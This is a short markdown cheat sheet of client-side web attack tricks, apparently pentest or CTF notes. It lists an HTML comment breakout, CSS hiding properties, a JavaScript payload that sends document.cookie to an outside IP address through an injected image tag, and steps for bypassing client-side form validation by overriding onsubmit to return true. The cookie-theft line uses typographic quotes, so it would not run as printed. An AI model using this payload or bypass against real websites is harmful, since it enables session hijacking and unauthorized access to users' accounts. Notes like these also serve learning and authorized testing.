# Client Side


## HTML Comment
- ```--!>```

## CSS Hidden Element
- ```display: none;```
- ```display: hidden;```

## Bypass JS Control
- Stealing Cookie: ```document.write(‘<img src=”http://192.168.8.105/?’ + document.cookie + ‘“ />’);```
- Return true
  - Go to page source code
  - Find validation script and copy it 
    - search for ```onsubmit``` 
  - Enable pasting
    - Browser => Console => allow pasting
  - remove ```if clause``` part and paste
```Javascript
function webform_onsubmit () {
return true;
}

```
